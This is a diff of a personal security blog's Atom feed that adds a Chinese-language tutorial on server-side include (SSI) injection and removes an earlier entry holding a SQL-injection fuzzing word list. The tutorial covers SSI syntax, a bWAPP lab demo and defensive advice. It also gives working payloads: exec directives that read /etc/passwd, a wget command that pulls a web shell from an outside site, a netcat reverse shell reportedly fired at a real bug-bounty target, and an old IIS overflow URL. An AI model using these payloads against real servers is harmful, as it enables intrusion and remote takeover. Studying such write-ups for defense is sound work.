@@ -6,7 +6,7 @@
   <link href="https://sakurahack-y.github.io/atom.xml" rel="self"/>
   
   <link href="https://sakurahack-y.github.io/"/>
-  <updated>2021-10-12T17:41:01.679Z</updated>
+  <updated>2021-10-13T16:14:08.068Z</updated>
   <id>https://sakurahack-y.github.io/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>ssi服务端包含注入</title>
+    <link href="https://sakurahack-y.github.io/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/"/>
+    <id>https://sakurahack-y.github.io/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/</id>
+    <published>2021-10-13T15:58:27.000Z</published>
+    <updated>2021-10-13T16:14:08.068Z</updated>
+    
+    <content type="html"><![CDATA[<p>​                                                      ssi服务端包含注入</p><p>SSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。</p><p>SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。</p><p>从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。</p><h1 id="SSI-配置和语法"><a href="#SSI-配置和语法" class="headerlink" title="SSI 配置和语法"></a>SSI 配置和语法</h1><h2 id="启用SSI"><a href="#启用SSI" class="headerlink" title="启用SSI"></a>启用SSI</h2><p>示例：Nginx 配置SSI功能</p><p>在http段中加入下面几句即可：</p><pre><code>ssi on;ssi_silent_errors off;ssi_types text/shtml;</code></pre><p>默认Apache不开启SSI，SSI这种技术已经比较少用了。如果应用没有使用到SSI，关闭服务器对SSI的支持即可。</p><h2 id="SSI语法"><a href="#SSI语法" class="headerlink" title="SSI语法"></a>SSI语法</h2><p>首先，介绍下SHTML，在SHTML文件中使用SSI指令引用其他的html文件（#include），此时服务器会将SHTML中包含的SSI指令解释，再传送给客户端，此时的HTML中就不再有SSI指令了。比如说框架是固定的，但是里面的文章，其他菜单等即可以用#include引用进来</p><pre><code class="html">①显示服务器端环境变量&lt;#echo&gt;本文档名称：&lt;!–#echo var=&quot;DOCUMENT_NAME&quot;–&gt;现在时间：&lt;!–#echo var=&quot;DATE_LOCAL&quot;–&gt;显示IP地址：&lt;! #echo var=&quot;REMOTE_ADDR&quot;–&gt;**②****将文本内容直接插入到文档中&lt;#include&gt;**&lt;! #include file=&quot;文件名称&quot;–&gt;&lt;!--#include virtual=&quot;index.html&quot; --&gt;&lt;! #include virtual=&quot;文件名称&quot;–&gt;&lt;!--#include virtual=&quot;/www/footer.html&quot; --&gt;注：file包含文件可以在同一级目录或其子目录中，但不能在上一级目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径    ③显示WEB文档相关信息&lt;#flastmod&gt;&lt;#fsize&gt;(如文件制作日期/大小等)文件最近更新日期：&lt;! #flastmod file=&quot;文件名称&quot;–&gt;文件的长度：&lt;!–#fsize file=&quot;文件名称&quot;–&gt;④直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序)&lt;!–#exec cmd=&quot;文件名称&quot;–&gt;&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;&lt;!–#exec cgi=&quot;文件名称&quot;–&gt;&lt;!--#exec cgi=&quot;/cgi-bin/access_log.cgi&quot;–&gt;将某一外部程序的输出插入到页面中。可插入CGI程序或者是常规应用程序的输入，这取决于使用的参数是cmd还是cgi。⑤设置SSI信息显示格式&lt;#config&gt;(如文件制作日期/大小显示方式)⑥高级SSI可设置变量使用if条件语句。</code></pre><h1 id="漏洞场景"><a href="#漏洞场景" class="headerlink" title="漏洞场景"></a>漏洞场景</h1><p>在很多业务中，用户输入的内容会显示在页面中。比如，一个存在反射型XSS漏洞的页面，如果输入的payload不是XSS代码而是SSI的标签，同时服务器又开启了对SSI的支持的话就会存在SSI漏洞。</p><p>从定义中看出，页面中有一小部分是动态输出的时候使用SSI，比如：</p><ul><li>文件相关的属性字段</li><li>当前时间</li><li>访客IP</li><li>调用CGI程序</li></ul><h1 id="SSI注入的条件"><a href="#SSI注入的条件" class="headerlink" title="SSI注入的条件"></a>SSI注入的条件</h1><p>当符合下列条件时，攻击者可以在 Web 服务器上运行任意命令：</p><ul><li><p>Web 服务器已支持SSI（服务器端包含）</p></li><li><p>Web 应用程序未对对相关SSI关键字做过滤</p></li><li><p>Web 应用程序在返回响应的HTML页面时，嵌入用户输入</p></li><li><p>SSI注入常用命令：</p></li><li><pre><code class="html">例子示例 1用于注入 SSI 的命令因使用的服务器操作系统而异。以下命令表示应用于执行 OS 命令的语法。Linux：列出目录下的文件：&lt;!--#exec cmd=&quot;ls&quot; --&gt;访问目录：&lt;!--#exec cmd=&quot;cd /root/dir/&quot;&gt;执行脚本：&lt;!--#exec cmd=&quot;wget http://mysite.com/shell.txt | rename shell.txt shell.php&quot; --&gt;视窗：列出目录下的文件：&lt;!--#exec cmd=&quot;dir&quot; --&gt;访问目录：&lt;!--#exec cmd=&quot;cd C:\admin\dir&quot;&gt;示例 2可用于访问和设置服务器信息的其他 SSI 示例：要更改错误消息输出：&lt;!--#config errmsg=&quot;File not found, informs users and password&quot;--&gt;显示当前文档文件名：&lt;!--#echo var=&quot;DOCUMENT_NAME&quot; --&gt;显示虚拟路径和文件名：&lt;!--#echo var=&quot;DOCUMENT_URI&quot; --&gt;使用“config”命令和“timefmt”参数，可以控制日期和时间输出格式：&lt;!--#config timefmt=&quot;A %B %d %Y %r&quot;--&gt;使用“fsize”命令，可以打印所选文件的大小：&lt;!--#fsize file=&quot;ssi.shtml&quot; --&gt;示例 3IIS 4.0 和 5.0 版本中的一个旧漏洞允许攻击者通过动态链接库（ssinc.dll）中的缓冲区溢出故障来获取系统权限。“ssinc.dll”用于解释进程服务器端包含。 CVE 2001-0506。通过创建包含以下 SSI 代码的恶意页面并强制应用程序加载此页面（路径遍历攻击），可以执行此攻击：ssi_over.shtml&lt;!--#include file=”UUUUUUUU...UU”--&gt;PS：“U”的数量需要大于2049。强制应用程序加载 ssi_over.shtml 页面：非恶意网址：www.vulnerablesite.org/index.asp?page=news.asp恶意网址：www.vulnerablesite.org/index.asp?page=www.malicioussite.com/ssi_over.shtml如果 IIS 返回空白页，则表明发生了溢出。在这种情况下，攻击者可能会操纵程序流并执行任意代码。</code></pre></li></ul><h1 id="SSI挖掘思路"><a href="#SSI挖掘思路" class="headerlink" title="SSI挖掘思路"></a>SSI挖掘思路</h1><p>两个思路：</p><ul><li>从业务场景来Fuzz，比如获取IP、定位、时间等</li><li>识别页面是否包含.stm,.shtm和.shtml后缀</li><li><a href="https://v.duoyinsu.com/"><strong>伏特分布式漏洞扫描平台</strong></a><strong>已经全面支持SSI检测。</strong></li></ul><p>google dork：’inurl:bin/cklb’</p><h1 id="SSI漏洞复现"><a href="#SSI漏洞复现" class="headerlink" title="SSI漏洞复现"></a>SSI漏洞复现</h1><h2 id="本地测试"><a href="#本地测试" class="headerlink" title="本地测试"></a>本地测试</h2><p>我们使用bWAPP来做漏洞演示环境</p><p>选择：’Server-Side Includes (SSI) Injection’</p><p><img src="/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjU3NTg1,size_16,color_FFFFFF,t_70.png" alt="img"></p><p><img src="/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjU3NTg1,size_16,color_FFFFFF,t_70.png" alt="img"> </p><p>成功执行了代码。</p><pre><code>再使用下exec指令使用cmd作为参数执行服务器端命令：&#39;&lt;!--#exec cmd=&quot;ls -al&quot;--&gt;&#39;</code></pre><p><img src="/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjU3NTg1,size_16,color_FFFFFF,t_70.png" alt="img"></p><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>运气好，刚好遇到个某SRC的。</p><pre><code class="html">&quot;--&gt;&#39;--&gt;`--&gt;&lt;&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;</code></pre><p>执行命令</p><p><img src="/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjU3NTg1,size_16,color_FFFFFF,t_70.png" alt="img"></p><pre><code class="html">&quot;--&gt;&#39;--&gt;`--&gt;&lt;&lt;!--#exec cmd=&quot;nc x.x.x.x 9090 -e /bin/bash&quot;--&gt;</code></pre><p>反弹shell</p><p><img src="/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjU3NTg1,size_16,color_FFFFFF,t_70.png" alt="img"></p><h1 id="SSI防御"><a href="#SSI防御" class="headerlink" title="SSI防御"></a>SSI防御</h1><ul><li>关闭服务器SSI功能</li><li>过滤相关SSI特殊字符（<code>&lt;,&gt;,#,-,&quot;,&#39;</code>）</li></ul>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;​                                                      ssi服务端包含注入&lt;/p&gt;
+&lt;p&gt;SSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动</summary>
+      
+    
+    
+    
+    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
+    
+    <category term="ssi" scheme="https://sakurahack-y.github.io/categories/CTF/ssi/"/>
+    
+    
+    <category term="ssi" scheme="https://sakurahack-y.github.io/tags/ssi/"/>
+    
+  </entry>
   
   <entry>
     <title>MRCTF2020-Ezpop</title>
@@ -528,32 +555,6 @@ import has</summary>
     
     
     <category term="sql" scheme="https://sakurahack-y.github.io/tags/sql/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>sql-fuzz测试字典</title>
-    <link href="https://sakurahack-y.github.io/2021/10/08/sql-fuzz%E6%B5%8B%E8%AF%95%E5%AD%97%E5%85%B8/"/>
-    <id>https://sakurahack-y.github.io/2021/10/08/sql-fuzz%E6%B5%8B%E8%AF%95%E5%AD%97%E5%85%B8/</id>
-    <published>2021-10-08T15:12:23.948Z</published>
-    <updated>2021-10-08T16:08:27.928Z</updated>
-    
-    <content type="html"><![CDATA[<p>length<br>+<br>handler<br>like<br>select<br>sleep<br>database<br>delete<br>having<br>or<br>as<br>-~<br>BENCHMARK<br>limit<br>left<br>select<br>insert<br>sys.schema_auto_increment_columns<br>join<br>right<br>#<br>&amp;<br>&amp;&amp;<br><br>handler</p><hr><p>–<br>–+<br>INFORMATION<br>–<br>;<br>!<br>%<br>+<br>xor<br>&lt;&gt;<br>(</p><blockquote></blockquote><p>&lt;<br>)<br>.<br>^<br>=<br>AND<br>BY<br>CAST<br>COLUMN<br>COUNT<br>CREATE<br>END<br>case<br>‘1’=’1<br>when<br>admin’<br>“<br>length<br>+<br>length<br>REVERSE<br>ascii<br>select<br>database<br>left<br>right<br>‘<br>union<br>||<br>oorr<br>/<br>//<br>//*<br><em>/</em><br>/**/<br>anandd<br>GROUP<br>HAVING<br>IF<br>INTO<br>JOIN<br>LEAVE<br>LEFT<br>LEVEL<br>sleep<br>LIKE<br>NAMES<br>NEXT<br>NULL<br>OF<br>ON<br>|<br>infromation_schema<br>user<br>OR<br>ORDER<br>ORD<br>SCHEMA<br>SELECT<br>SET<br>TABLE<br>THEN<br>UPDATE<br>USER<br>USING<br>VALUE<br>VALUES<br>WHEN<br>WHERE<br>ADD<br>AND<br>prepare<br>set<br>update<br>delete<br>drop<br>inset<br>CAST<br>COLUMN<br>CONCAT<br>GROUP_CONCAT<br>group_concat<br>CREATE<br>DATABASE<br>DATABASES<br>alter<br>DELETE<br>DROP<br>floor<br>rand()<br>information_schema.tables<br>TABLE_SCHEMA<br>%df<br>concat_ws()<br>concat<br>LIMIT<br>ORD<br>ON<br>extractvalue<br>order<br>CAST()<br>by<br>ORDER<br>OUTFILE<br>RENAME<br>REPLACE<br>SCHEMA<br>SELECT<br>SET<br>updatexml<br>SHOW<br>SQL<br>TABLE<br>THEN<br>TRUE<br>instr<br>benchmark<br>format<br>bin<br>substring<br>ord<br>UPDATE<br>VALUES<br>VARCHAR<br>VERSION<br>WHEN<br>WHERE<br>/*<br>`<br>,<br>users<br>%0a<br>%0b<br>mid<br>for<br>BEFORE<br>REGEXP<br>RLIKE<br>in<br>sys schemma<br>SEPARATOR<br>XOR<br>CURSOR<br>FLOOR<br>sys.schema_table_statistics_with_buffer<br>INFILE<br>count<br>%0c<br>from<br>%0d<br>%a0<br>=<br>@<br>else<br>substr</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;length&lt;br&gt;+&lt;br&gt;handler&lt;br&gt;like&lt;br&gt;select&lt;br&gt;sleep&lt;br&gt;database&lt;br&gt;delete&lt;br&gt;having&lt;br&gt;or&lt;br&gt;as&lt;br&gt;-~&lt;br&gt;BENCHMARK&lt;br&gt;limit&lt;br&gt;left&lt;br&gt;sele</summary>
-      
-    
-    
-    
-    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
-    
-    <category term="字典" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%AD%97%E5%85%B8/"/>
-    
-    
-    <category term="字典" scheme="https://sakurahack-y.github.io/tags/%E5%AD%97%E5%85%B8/"/>
     
   </entry>
   
